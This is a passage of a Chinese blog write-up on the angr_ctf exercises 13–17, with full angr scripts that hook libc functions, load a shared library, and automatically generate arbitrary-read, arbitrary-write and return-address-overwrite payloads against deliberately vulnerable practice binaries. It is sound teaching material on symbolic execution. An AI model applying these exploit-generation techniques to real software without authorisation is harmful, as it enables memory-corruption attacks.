class="number">0</span>]</span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="小总结03">小总结03</span></h3><p>如上的五个题都是在避免路径爆炸或者避免一些麻烦时引入的代替原程序部分代码办法或者采取优化性能的办法，使得路径能够完整，让模拟器能够模拟出原程序运行路径。以至于方便最后找到正确路径。</p><h3><span id="13_angr_static_binary">13_angr_static_binary</span></h3><p>本题处理静态编译的程序。在动态链接的程序里面，对于标准库函数的调用，angr自动的将其替换为更相应高效的simProcedure.但是在静态编译的程序里面这些函数需要我们手动替换。替换时，我们只需要将需要用到的函数替换即可，大可不必全部替换。</p><p><img src="23.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">    path_to_binary=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path_to_binary)</span><br><span class="line">    initial_state=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    __libc_start_main_address=<span class="number">0x8048D10</span></span><br><span class="line">    printf_address=<span class="number">0x804ED40</span></span><br><span class="line">    _isoc99_scanf_address=<span class="number">0x804ED80</span></span><br><span class="line">    strcmp_address=<span class="number">0x805B450</span></span><br><span class="line">    puts_address=<span class="number">0x804F350</span></span><br><span class="line">    project.hook(__libc_start_main_address,angr.SIM_PROCEDURES[<span class="string">'glibc'</span>][<span class="string">'__libc_start_main'</span>]())</span><br><span class="line">    project.hook(printf_address, angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'printf'</span>]())</span><br><span class="line">    project.hook(_isoc99_scanf_address, angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'scanf'</span>]())</span><br><span class="line">    project.hook(strcmp_address, angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'strcmp'</span>]())</span><br><span class="line">    project.hook(puts_address, angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'puts'</span>]())</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="14_angr_shared_library">14_angr_shared_library</span></h3><p>本题是告诉我们如何分析不是可执行程序的二进制文件。比如典型的动态链接库。本题关键函数是在lib14_angr_shared_library.so中。14_angr_shared_library调用so文件中的validate函数，成功就返回True,否则就是False.</p><p><img src="25.png" alt></p><p><img src="24.png" alt></p><p><img src="26.png" alt></p><p><img src="27.png" alt></p><p>关键验证代码都在so文件中，因此本题需要angr加载so文件进行分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  <span class="comment">#该路径因为so文件名，因为核心函数是在so文件中</span></span><br><span class="line">  path_to_binary =argv[<span class="number">1</span>]</span><br><span class="line">  <span class="comment">#随便指定一个基地址，模仿加载so文件</span></span><br><span class="line">  base = <span class="number">0x4000000</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123; </span><br><span class="line">    <span class="string">'main_opts'</span> : &#123; </span><br><span class="line">      <span class="string">'base_addr'</span> : base </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">#创建一个指针形式的位向量，当作参数传进去validate函数，第一个参数随便指定一个值</span></span><br><span class="line">  password_pointer=claripy.BVV(<span class="number">0x3000000</span>,<span class="number">32</span>)</span><br><span class="line">  <span class="comment">#validate函数在so文件中的偏移加上基地址，模仿出程序运行时的真实地址。</span></span><br><span class="line">  validate_function_address = base+<span class="number">0x6D7</span></span><br><span class="line">  <span class="comment">#创建初始路径，直接从validate真实函数地址开始，传入相应参数</span></span><br><span class="line">  initial_state = project.factory.call_state(</span><br><span class="line">                    validate_function_address,</span><br><span class="line">                    password_pointer,</span><br><span class="line">                    <span class="number">8</span></span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">  <span class="comment">#创建password的位向量，将password与之前的传入指针形式的参数绑定在一起</span></span><br><span class="line">  <span class="comment">#确保validate验证的值是当前的password</span></span><br><span class="line">  password=claripy.BVS(<span class="string">'password'</span>,<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  initial_state.memory.store(password_pointer,password)</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="comment">#validate函数的结束地址</span></span><br><span class="line">  success_address = base+<span class="number">0x783</span> </span><br><span class="line">  simulation.explore(find=success_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#验证validate的返回值，如果是1则验证成功，打印出来，否则当前路径无效。</span></span><br><span class="line">    solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>)</span><br><span class="line">    solution = solution_state.solver.eval(password,cast_to=bytes).decode()</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="15_angr_arbitrary_read">15_angr_arbitrary_read</span></h3><p>本题咋一看不知道说的是什么。题目本身也比较简单，根据题目命猜测想要任意地址读。</p><p><img src="28.png" alt></p><p>分析本题，其实可以通过V4的栈溢出控制s，控制s的值就可以实现任意地址读了。这个是在pwn里面一眼就看出来的东西。我就一直不明白在angr中有什么用。然后我就仔细研究代码，发现angr并不需要你懂栈溢出的原理。根据题目规定的值写好变量，然后设置好想要的预期效果，angr自动帮你生成payload，前提是题目本身就有漏洞存在。同时还可以对payload进行一些规定，比如需要写入的都是可见字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state =project.factory.entry_state()</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#hook掉scanf，与11题一样</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, format_string, key , password)</span>:</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">'scanf0'</span>, <span class="number">32</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">'scanf1'</span>, <span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line">      <span class="comment">#对字符串进行一个限制，限制为大写英文字符</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">'A'</span>, char &lt;= <span class="string">'Z'</span>)</span><br><span class="line"></span><br><span class="line">      scanf0_address = key</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      scanf1_address = password</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1)</span><br><span class="line"></span><br><span class="line">      self.state.globals[<span class="string">'solution0'</span>] = scanf0</span><br><span class="line">      self.state.globals[<span class="string">'solution1'</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">r'__isoc99_scanf'</span>  <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  <span class="comment">#设置一个回调函数，在程序调用puts函数成功之后，使用这个函数</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_puts</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="comment">#检查调用puts参数，注意这里是调用成功了puts函数，此时esp指向返回地址，返回地址下面一个栈单位是puts参数。</span></span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp+<span class="number">0x4</span>, <span class="number">4</span>, endness=project.arch.memory_endness)</span><br><span class="line">    <span class="comment">#检查puts参数是否与'Good Job'字符串地址相同</span></span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(puts_parameter):</span><br><span class="line">      good_job_string_address = <span class="number">0x484F4A47</span> <span class="comment"># :integer, probably hexadecimal</span></span><br><span class="line">      is_vulnerable_expression = good_job_string_address==puts_parameter <span class="comment"># :boolean bitvector expression</span></span><br><span class="line">      copied_state = state.copy()</span><br><span class="line">      copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">      <span class="comment"># Finally, we test if we can satisfy the constraints of the state.</span></span><br><span class="line">      <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">        <span class="comment"># Before we return, let's add the constraint to the solver for real.</span></span><br><span class="line">        state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># not state.se.symbolic(???)</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="comment">#puts函数的plt表</span></span><br><span class="line">    puts_address = <span class="number">0x8048370</span></span><br><span class="line">    <span class="comment">#此处判断程序是否成功调用puts函数，调用成功就检查参数</span></span><br><span class="line">    <span class="comment">#函数返回成功说明成功打印"Good JOb"</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">      <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution0=solution_state.globals[<span class="string">"solution0"</span>]</span><br><span class="line">    solution1=solution_state.globals[<span class="string">"solution1"</span>]</span><br><span class="line">    solution = <span class="string">r'%u %20s'</span>%(solution_state.solver.eval(solution0),solution_state.solver.eval(solution1,cast_to=bytes).decode(<span class="string">"UTF-8"</span>))</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="16_angr_arbitrary_write">16_angr_arbitrary_write</span></h3><p>使用angr生成对存在漏洞的程序进行任意地址写的payload。</p><p><img src="29.png" alt></p><p>如题，本题不加任何漏洞利用，则永远不可能打印出”Good Job.” 因此需要使用angr自动生成一串payload，将password_buffer指向的内存改为”NDYNWEUJ”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  <span class="comment">#与上题一样</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, format_string,key , password)</span>:</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">'scanf0'</span>, <span class="number">32</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">'scanf1'</span>, <span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">'A'</span>, char &lt;= <span class="string">'Z'</span>)</span><br><span class="line"></span><br><span class="line">      scanf0_address = key</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      scanf1_address = password</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1)</span><br><span class="line"></span><br><span class="line">      self.state.globals[<span class="string">'solution0'</span>] = scanf0</span><br><span class="line">      self.state.globals[<span class="string">'solution1'</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">r'__isoc99_scanf'</span>  <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  <span class="comment">#该函数是在嗲用strncpy起作用</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_strncpy</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="comment">#strncpy(dest,src,len)</span></span><br><span class="line">    <span class="comment">#因此第一个参数是dest,在调用strncpy之后 esp指向的是返回地址，下面一个栈单位是第一个参数，紧接着第二个参数，第三个参数。。。。</span></span><br><span class="line">    strncpy_dest = state.memory.load(state.regs.esp+<span class="number">0x4</span>,<span class="number">4</span>,endness=project.arch.memory_endness)</span><br><span class="line">    strncpy_src = state.memory.load(state.regs.esp+<span class="number">0x8</span>,<span class="number">4</span>,endness=project.arch.memory_endness)</span><br><span class="line">    strncpy_len = state.memory.load(state.regs.esp+<span class="number">0xc</span>,<span class="number">4</span>,endness=project.arch.memory_endness)</span><br><span class="line">    <span class="comment">#读出src指向的内容</span></span><br><span class="line">    src_contents = state.memory.load(strncpy_src,strncpy_len)</span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(src_contents) <span class="keyword">and</span> state.se.symbolic(strncpy_dest):</span><br><span class="line">      password_string = <span class="string">r"NDYNWEUJ"</span> <span class="comment"># :string</span></span><br><span class="line">      buffer_address = <span class="number">0x57584344</span> <span class="comment"># :integer, probably in hexadecimal</span></span><br><span class="line">      <span class="comment">#检查src的前八个字节是否与password相同</span></span><br><span class="line">      does_src_hold_password = src_contents[<span class="number">-1</span>:<span class="number">-64</span>] == password_string</span><br><span class="line">      <span class="comment">#检查dest的地址是否与password_buffer地址相同</span></span><br><span class="line">      does_dest_equal_buffer_address = buffer_address == strncpy_dest</span><br><span class="line">      <span class="keyword">if</span> state.satisfiable(extra_constraints=(does_src_hold_password, does_dest_equal_buffer_address)):</span><br><span class="line">        state.add_constraints(does_src_hold_password, does_dest_equal_buffer_address)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># not state.se.symbolic</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="comment">#strncpy的plt表</span></span><br><span class="line">    strncpy_address = <span class="number">0x8048410</span></span><br><span class="line">    <span class="comment">#调用strncpy成功时，调用check_strncpy.</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == strncpy_address:</span><br><span class="line">      <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution0=solution_state.globals[<span class="string">"solution0"</span>]</span><br><span class="line">    solution1=solution_state.globals[<span class="string">"solution1"</span>]</span><br><span class="line">    solution = <span class="string">r'%u %20s'</span>%(solution_state.solver.eval(solution0),solution_state.solver.eval(solution1,cast_to=bytes).decode(<span class="string">"UTF-8"</span>))</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="17_angr_arbitrary_jump">17_angr_arbitrary_jump</span></h3><p>任意地址跳转。实际上就是通过栈溢出控制返回地址。不过payload使用angr自动生成。</p><p><img src="30.png" alt></p><p><img src="31.png" alt></p><p><img src="32.png" alt></p><p>在read_input()函数中，存在栈溢出漏洞。我们需要控制函数跳转到print_good函数。</p><p>首先需要介绍一些无约束的路径。当程序进入了下一条指令可以是任何地址的时候，该条路径就属于无约束路径。一般来说这种路径是没有意义的，angr会默认抛弃掉该条路径，使该条路径变为unconstrained。本题无约束的路径正是我们需要的。当初发栈溢出之后，该路径就会变为无约束路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  <span class="comment">#将输入流换为指定的位向量</span></span><br><span class="line">  input_str=claripy.BVS(<span class="string">"payload"</span>,<span class="number">100</span>*<span class="number">8</span>)</span><br><span class="line">  initial_state = project.factory.entry_state(stdin=input_str)</span><br><span class="line">  <span class="comment">#stashes中的一些列表不是默认开启的。stashes中保存则不同类别的路径</span></span><br><span class="line">  <span class="comment">#active为激活路径，unconstrained为无约束路径，found路径为成功找到的路径</span></span><br><span class="line">  simulation = project.factory.simgr(</span><br><span class="line">                initial_state, save_unconstrained=<span class="literal">True</span>,</span><br><span class="line">                stashes=&#123;</span><br><span class="line">                  <span class="string">'active'</span>: [initial_state],</span><br><span class="line">                  <span class="string">'unconstrained'</span>:[],</span><br><span class="line">                  <span class="string">'found'</span>:[],</span><br><span class="line">                  <span class="string">'not_needed'</span>:[]</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">has_found_solution</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> simulation.found</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">has_unconstrained</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> simulation.unconstrained</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">has_active</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> simulation.active</span><br><span class="line"></span><br><span class="line">  <span class="comment">#循环找到每条未成功但是是激活或者无约束的路径</span></span><br><span class="line">  <span class="keyword">while</span> (has_active() <span class="keyword">or</span> has_unconstrained()) <span class="keyword">and</span> (<span class="keyword">not</span> has_found_solution()):</span><br><span class="line">    <span class="keyword">for</span> unconstrained_state <span class="keyword">in</span> simulation.unconstrained:</span><br><span class="line">      <span class="comment">#针对每个无约束的路径，约束该路径的eip的值</span></span><br><span class="line">      unconstrained_state.add_constraints(unconstrained_state.regs.eip == <span class="number">0x42585249</span>)</span><br><span class="line">      <span class="comment">#如果该无约束路径的eip是我们想要的，则将该路径转为成功路径。</span></span><br><span class="line">      simulation.move(<span class="string">'unconstrained'</span>, <span class="string">'found'</span>)</span><br><span class="line">    simulation.step()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state=simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#约束该路径的输入为可见字符，若不是，则抛弃该路径。</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> input_str.chop(bits=<span class="number">8</span>):</span><br><span class="line">      solution_state.add_constraints(byte &gt;= <span class="string">'A'</span>, byte &lt;= <span class="string">'Z'</span>)</span><br><span class="line">    solution = solution_state.solver.eval(input_str,cast_to=bytes).decode()</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2><span 